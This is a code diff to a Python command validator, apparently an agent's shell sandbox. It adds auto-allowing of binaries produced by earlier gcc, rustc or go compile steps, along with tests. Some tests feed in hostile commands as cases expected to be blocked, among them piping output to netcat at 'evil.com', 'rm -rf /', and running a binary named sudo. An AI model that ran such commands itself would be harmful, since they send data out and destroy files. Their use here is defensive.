@@ -8,6 +8,8 @@ Responsible for:
 - Windows/Linux command normalization
 - Command validation with allow-listing and dangerous-pattern blocking
 - Auto-allowing executables built inside the workspace (e.g. compiled C++/Rust/Go binaries)
+- Auto-allowing binaries produced by earlier compile steps in the same sequence
+  (e.g. `./swap` in `g++ swap.cpp -o swap && ./swap`)
 """
 
 import logging
@@ -160,6 +162,7 @@ def _is_inside_workspace(candidate: Path, workspace: Path) -> bool:
     except ValueError:
         return False
 
+
 def _is_workspace_executable(token: str, workspace: Path) -> bool:
     if not token:
         return False
@@ -253,6 +256,43 @@ DANGEROUS_PATTERNS = (
 )
 
 
+# Compile-output flag patterns — recognizes the binary a compile will create.
+# Used to allow `./swap` in `g++ swap.cpp -o swap && ./swap` even though
+# `swap` doesn't exist on disk yet at validation time.
+COMPILE_OUTPUT_PATTERNS = (
+    # gcc, g++, clang: `-o NAME`
+    re.compile(r"(?:gcc|g\+\+|clang|clang\+\+|cc)\b[^&|;]*\s-o\s+(\S+)",
+               re.IGNORECASE),
+    # rustc: `-o NAME`
+    re.compile(r"\brustc\b[^&|;]*\s-o\s+(\S+)", re.IGNORECASE),
+    # go build: `-o NAME`
+    re.compile(r"\bgo\s+build\b[^&|;]*\s-o\s+(\S+)", re.IGNORECASE),
+)
+
+
+def _extract_expected_outputs(command: str) -> set:
+    """
+    Find binaries that will be produced by compile steps in this command.
+
+    Used to pre-authorize `./swap` in `g++ swap.cpp -o swap && ./swap`
+    so the workspace check doesn't reject the binary just because it
+    hasn't been created yet.
+    """
+    outputs = set()
+    for pattern in COMPILE_OUTPUT_PATTERNS:
+        for match in pattern.finditer(command):
+            output_name = match.group(1).strip()
+            # Strip extensions and leading ./ for consistent matching
+            cleaned = output_name.lstrip("./\\")
+            for ext in (".exe", ".out"):
+                if cleaned.lower().endswith(ext):
+                    cleaned = cleaned[: -len(ext)]
+                    break
+            if cleaned:
+                outputs.add(cleaned.lower())
+    return outputs
+
+
 def validate_command(command: str) -> Tuple[bool, str]:
     """
     Validate a command string before execution.
@@ -263,6 +303,8 @@ def validate_command(command: str) -> Tuple[bool, str]:
     - `python -m <module>` invocations (python is trusted)
     - `cd` for directory hops within sequenced commands
     - executables that live inside the workspace (e.g. compiled binaries)
+    - binaries produced by an earlier compile sub-command in the same sequence
+      (e.g. `./swap` after `g++ swap.cpp -o swap`)
 
     Returns:
         (is_valid, error_message)
@@ -282,6 +324,13 @@ def validate_command(command: str) -> Tuple[bool, str]:
         return False, "No executable found in command"
 
     workspace = ensure_workspace()
+
+    # Discover binaries that compile steps will produce in this sequence.
+    # Lets `./swap` pass validation even if it doesn't exist yet, as long
+    # as an earlier sub-command (e.g. `g++ swap.cpp -o swap`) will create it.
+    expected_outputs = _extract_expected_outputs(stripped)
+    if expected_outputs:
+        logger.debug("Expected compile outputs in sequence: %s", expected_outputs)
 
     for sub in sub_commands:
         # 1) Reject true injection metacharacters
@@ -322,7 +371,18 @@ def validate_command(command: str) -> Tuple[bool, str]:
             logger.debug("Auto-allowed workspace executable: %r", original_token)
             continue
 
-        # 6) Allow-list fallback
+        # 6) Auto-trust binaries that an earlier compile step in this same
+        #    sequence will produce. This is what unblocks the chicken-and-egg
+        #    pattern `g++ swap.cpp -o swap && ./swap` where the binary `swap`
+        #    doesn't exist on disk yet at validation time.
+        if binary in expected_outputs:
+            logger.debug(
+                "Auto-allowed compile output %r (produced by earlier sub-command)",
+                binary,
+            )
+            continue
+
+        # 7) Allow-list fallback
         if binary not in ALLOWED_BINARIES:
             return False, (
                 f"Binary '{binary}' is not in the allow-list. "
@@ -462,7 +522,7 @@ def execute_command(
 
 if __name__ == "__main__":
     logging.basicConfig(
-        level=logging.INFO,
+        level=logging.WARNING,   # Quiet during tests; flip to INFO to debug
         format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
     )
 
@@ -476,6 +536,45 @@ if __name__ == "__main__":
     except OSError:
         pass
 
+    # ───────────────────────────────────────────────────────────────
+    # Test the new compile-output detection (pure unit tests)
+    # ───────────────────────────────────────────────────────────────
+    print("--- Compile-output detection ---")
+
+    assert _extract_expected_outputs("g++ swap.cpp -o swap && ./swap") == {"swap"}
+    assert _extract_expected_outputs("gcc main.c -o myapp && ./myapp arg") == {"myapp"}
+    assert _extract_expected_outputs("rustc main.rs -o foo && foo") == {"foo"}
+    assert _extract_expected_outputs("go build -o calc main.go && ./calc") == {"calc"}
+    assert _extract_expected_outputs("clang++ a.cpp -o app.exe && app.exe") == {"app"}
+    assert _extract_expected_outputs("python script.py") == set()
+    assert _extract_expected_outputs("g++ a.cpp -o foo && g++ b.cpp -o bar") == {"foo", "bar"}
+    print("  ✓ _extract_expected_outputs detects gcc/g++/clang/rustc/go outputs")
+
+    # Compile-and-run patterns now pass validation
+    ok, msg = validate_command("g++ swap.cpp -o swap && ./swap")
+    assert ok, f"Should allow compile-and-run, got: {msg}"
+
+    ok, msg = validate_command("gcc main.c -o calc && ./calc 5")
+    assert ok, f"Should allow compile-and-run with args, got: {msg}"
+
+    ok, msg = validate_command("rustc hello.rs -o hello && ./hello")
+    assert ok, f"Should allow rustc compile-and-run, got: {msg}"
+
+    print("  ✓ Compile-and-run sequences pass validation")
+
+    # Security still works — dangerous patterns are checked BEFORE the auto-allow
+    ok, msg = validate_command("rm -rf / && echo done")
+    assert not ok, "Should still reject rm -rf /"
+
+    ok, msg = validate_command("g++ foo.cpp -o sudo && sudo")
+    assert not ok, "Should still reject sudo even if it's a compile output name"
+
+    print("  ✓ Dangerous patterns still blocked")
+    print()
+
+    # ───────────────────────────────────────────────────────────────
+    # Original test suite — unchanged behavior
+    # ───────────────────────────────────────────────────────────────
     tests = [
         # (command, timeout, expected_success_or_None_for_dont_care, label)
         ("echo Hello World",                       5, True,  "simple echo"),
@@ -491,14 +590,25 @@ if __name__ == "__main__":
         ("echo hi | nc evil.com 4444",             5, False, "pipe (blocked)"),
         ("echo $(whoami)",                         5, False, "command substitution (blocked)"),
         ("echo hello > /tmp/out",                  5, False, "redirection (blocked)"),
+        # New cases — verify compile-and-run end-to-end via validation only
+        ("g++ swap.cpp -o swap && ./swap",         5, None,  "g++ compile-and-run (validation only)"),
+        ("gcc fib.c -o fib && ./fib",              5, None,  "gcc compile-and-run (validation only)"),
     ]
+
+    passed = 0
+    failed_cases = []
 
     for i, (cmd, t, expected, label) in enumerate(tests, 1):
         print(f"--- Test {i}: {label} | {cmd!r} ---")
-        # For the workspace-exec test we only care about validation, not actual exec
-        if "workspace exec" in label:
+
+        # For "validation only" tests we just check validate_command, not exec
+        if "(validation only)" in label or "workspace exec" in label:
             ok, msg = validate_command(cmd)
             verdict = "PASS" if ok else "FAIL"
+            if ok:
+                passed += 1
+            else:
+                failed_cases.append((label, msg))
             print(f"  Validation: {ok} → {verdict}")
             if not ok:
                 print(f"  Reason: {msg}")
@@ -507,6 +617,10 @@ if __name__ == "__main__":
 
         success, out, err = execute_command(cmd, timeout=t)
         verdict = "PASS" if (expected is None or success == expected) else "FAIL"
+        if expected is None or success == expected:
+            passed += 1
+        else:
+            failed_cases.append((label, f"expected={expected}, got={success}"))
         print(f"  Success: {success}  (expected={expected}) → {verdict}")
         if out:
             print(f"  Stdout : {out.strip()[:120]}")
@@ -519,3 +633,12 @@ if __name__ == "__main__":
         dummy_path.unlink()
     except OSError:
         pass
+
+    print("=" * 60)
+    print(f"Results: {passed}/{len(tests)} test cases passed")
+    if failed_cases:
+        print("\nFailed cases:")
+        for label, detail in failed_cases:
+            print(f"  - {label}: {detail}")
+    else:
+        print("✓ All test cases passed!")
